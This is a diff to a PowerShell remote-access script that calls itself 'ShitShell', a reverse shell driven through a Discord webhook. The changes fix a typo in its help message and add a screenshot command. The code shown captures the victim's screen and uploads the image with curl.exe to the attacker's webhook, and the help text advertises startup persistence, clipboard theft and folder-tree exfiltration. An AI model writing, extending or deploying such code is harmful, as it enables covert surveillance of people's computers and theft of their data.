@@ -12,13 +12,14 @@ $jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | ShitShell session started!"
             description = "``The worst Reverse Shell out there!" +
-                          "`nYou can youse the following commands:``" +
+                          "`nYou can use the following commands:``" +
                           "`n`n:arrow_forward: Close: Closes the current ShitShell session." +
                           "`n:arrow_forward: FolderTree: Gets folder trees and sends it to your Webhook." +
                           "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin." +
                           "`n:arrow_forward: AddPersistance: Runs script on startup." +
                           "`n:arrow_forward: RemovePersistance: Removes persistance. " +
-                          "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook."
+                          "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook." +
+                          "`n:arrow_forward: TakeScreenshot: Sends a screenshot to your webhook."
             color       = 16711680
             author      = @{
                 name     = "ShitShell"
@@ -186,7 +187,7 @@ function TakeScreenshot {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":clipboard:File_from_Clipboard:\"}"' $hookurl | Out-Null
+    curl.exe -F "file1=@$filett" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":camera:Screenshot:\"}"' $hookurl | Out-Null
     Start-Sleep 1
     Remove-Item -Path $filett
  
